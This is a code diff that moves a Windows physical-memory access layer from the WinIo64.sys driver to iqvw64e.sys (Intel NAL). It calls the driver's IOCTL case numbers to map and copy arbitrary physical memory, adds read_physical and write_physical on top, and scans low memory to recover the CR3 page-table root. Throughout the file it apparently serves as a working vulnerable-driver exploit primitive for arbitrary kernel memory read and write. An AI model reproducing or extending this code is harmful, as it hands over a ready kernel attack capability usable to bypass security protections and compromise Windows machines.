@@ -1,44 +1,51 @@
-// ioctl.cpp -- WinIo64.sys physmem MAP/UNMAP implementation.
+// ioctl.cpp -- iqvw64e.sys (Intel NAL) physmem implementation.
 
 #include "ioctl.h"
 
 #include <algorithm>
 #include <cstdio>
 #include <cstring>
+#include <vector>
 
 namespace ioctl {
 
-bool map_physical(HANDLE device, uint64_t phys, uint32_t size, RwFlag /*rw*/, Handle& h) {
-    std::memset(&h, 0, sizeof(h));
-    h.dwPhysMemSizeInBytes = size;
-    h.pvPhysAddress        = phys;
-
+static bool nal_call(HANDLE device, void* buf, DWORD buf_size) {
     DWORD returned = 0;
-    BOOL ok = DeviceIoControl(device, IOCTL_MAP_PHYS,
-                              &h, sizeof(h),
-                              &h, sizeof(h),
-                              &returned, nullptr);
-    if (!ok || h.pvPhysMemLin == 0) {
-        std::printf("[!] ioctl::map_physical failed (phys=%016llX size=%u err=%lu)\n",
-                    static_cast<unsigned long long>(phys), size, GetLastError());
-        return false;
-    }
-    return true;
+    return DeviceIoControl(device, IOCTL_NAL,
+                           buf, buf_size, buf, buf_size,
+                           &returned, nullptr) != FALSE;
 }
 
-bool unmap_physical(HANDLE device, const Handle& h) {
-    DWORD returned = 0;
-    Handle buf = h;
-    BOOL ok = DeviceIoControl(device, IOCTL_UNMAP_PHYS,
-                              &buf, sizeof(buf),
-                              &buf, sizeof(buf),
-                              &returned, nullptr);
-    if (!ok) {
-        std::printf("[!] ioctl::unmap_physical failed (va=%016llX err=%lu)\n",
-                    static_cast<unsigned long long>(h.pvPhysMemLin), GetLastError());
+static bool map_io_space(HANDLE device, uint64_t phys, uint64_t size, uint64_t& kernel_va) {
+    MapIoSpace req{};
+    req.case_number = 0x19;
+    req.phys_addr = phys;
+    req.size = size;
+    if (!nal_call(device, &req, sizeof(req))) {
+        std::printf("[!] ioctl::map_io_space failed (phys=%016llX size=%llu err=%lu)\n",
+                    static_cast<unsigned long long>(phys),
+                    static_cast<unsigned long long>(size), GetLastError());
         return false;
     }
-    return true;
+    kernel_va = req.return_virt_addr;
+    return kernel_va != 0;
+}
+
+static bool unmap_io_space(HANDLE device, uint64_t kernel_va, uint64_t size) {
+    UnmapIoSpace req{};
+    req.case_number = 0x1A;
+    req.virt_addr = kernel_va;
+    req.size = size;
+    return nal_call(device, &req, sizeof(req));
+}
+
+static bool nal_copy(HANDLE device, uint64_t src, uint64_t dst, uint64_t len) {
+    NalCopyMem req{};
+    req.case_number = 0x21;
+    req.source = src;
+    req.destination = dst;
+    req.length = len;
+    return nal_call(device, &req, sizeof(req));
 }
 
 bool read_physical(HANDLE device, uint64_t phys, void* dst, size_t size) {
@@ -47,14 +54,14 @@ bool read_physical(HANDLE device, uint64_t phys, void* dst, size_t size) {
         uint64_t page_off = phys & 0xFFFULL;
         size_t   chunk    = std::min<size_t>(size, 0x1000 - static_cast<size_t>(page_off));
 
-        Handle h{};
-        if (!map_physical(device, phys & ~0xFFFULL, 0x1000, RW_READ, h))
+        uint64_t kva = 0;
+        if (!map_io_space(device, phys & ~0xFFFULL, 0x1000, kva))
             return false;
 
-        std::memcpy(out, reinterpret_cast<uint8_t*>(h.pvPhysMemLin) + page_off, chunk);
-
-        if (!unmap_physical(device, h))
-            return false;
+        bool ok = nal_copy(device, kva + page_off,
+                           reinterpret_cast<uint64_t>(out), chunk);
+        unmap_io_space(device, kva, 0x1000);
+        if (!ok) return false;
 
         phys += chunk;
         out  += chunk;
@@ -69,14 +76,14 @@ bool write_physical(HANDLE device, uint64_t phys, const void* src, size_t size) 
         uint64_t page_off = phys & 0xFFFULL;
         size_t   chunk    = std::min<size_t>(size, 0x1000 - static_cast<size_t>(page_off));
 
-        Handle h{};
-        if (!map_physical(device, phys & ~0xFFFULL, 0x1000, RW_WRITE, h))
+        uint64_t kva = 0;
+        if (!map_io_space(device, phys & ~0xFFFULL, 0x1000, kva))
             return false;
 
-        std::memcpy(reinterpret_cast<uint8_t*>(h.pvPhysMemLin) + page_off, in, chunk);
-
-        if (!unmap_physical(device, h))
-            return false;
+        bool ok = nal_copy(device, reinterpret_cast<uint64_t>(in),
+                           kva + page_off, chunk);
+        unmap_io_space(device, kva, 0x1000);
+        if (!ok) return false;
 
         phys += chunk;
         in   += chunk;
@@ -85,21 +92,26 @@ bool write_physical(HANDLE device, uint64_t phys, const void* src, size_t size) 
     return true;
 }
 
-// Map the low 1 MB and scan for the PROCESSOR_START_BLOCK fingerprint.
-// CR3 sits at offset 160 of the matching page. Three qword fingerprints
-// at offsets 0, 112, 160 uniquely identify the struct across Windows 10/11.
 bool get_pml4_phys(HANDLE device, uint64_t& cr3) {
-    Handle h{};
-    if (!map_physical(device, 0, 0x100000, RW_READ, h))
+    uint64_t kva = 0;
+    if (!map_io_space(device, 0, 0x100000, kva))
         return false;
 
-    const uint8_t* mem = reinterpret_cast<const uint8_t*>(h.pvPhysMemLin);
-    cr3 = 0;
+    std::vector<uint8_t> mem(0x100000);
+    bool copied = nal_copy(device, kva,
+                           reinterpret_cast<uint64_t>(mem.data()), 0x100000);
+    unmap_io_space(device, kva, 0x100000);
 
+    if (!copied) {
+        std::printf("[!] ioctl::get_pml4_phys: copy of low 1MB failed\n");
+        return false;
+    }
+
+    cr3 = 0;
     for (uint32_t off = 0x1000; off < 0x100000; off += 0x1000) {
-        uint64_t sig0   = *reinterpret_cast<const uint64_t*>(mem + off);
-        uint64_t ptr112 = *reinterpret_cast<const uint64_t*>(mem + off + 112);
-        uint64_t val160 = *reinterpret_cast<const uint64_t*>(mem + off + 160);
+        uint64_t sig0   = *reinterpret_cast<const uint64_t*>(mem.data() + off);
+        uint64_t ptr112 = *reinterpret_cast<const uint64_t*>(mem.data() + off + 112);
+        uint64_t val160 = *reinterpret_cast<const uint64_t*>(mem.data() + off + 160);
 
         if ((sig0   & 0xFFFFFFFFFFFF00FFULL) == 0x00000001000600E9ULL &&
             (ptr112 & 0xFFFFF80000000003ULL) == 0xFFFFF80000000000ULL &&
@@ -108,8 +120,6 @@ bool get_pml4_phys(HANDLE device, uint64_t& cr3) {
             break;
         }
     }
-
-    unmap_physical(device, h);
 
     if (cr3 == 0) {
         std::printf("[!] ioctl::get_pml4_phys: CR3 scan found no matching page in low 1 MB\n");
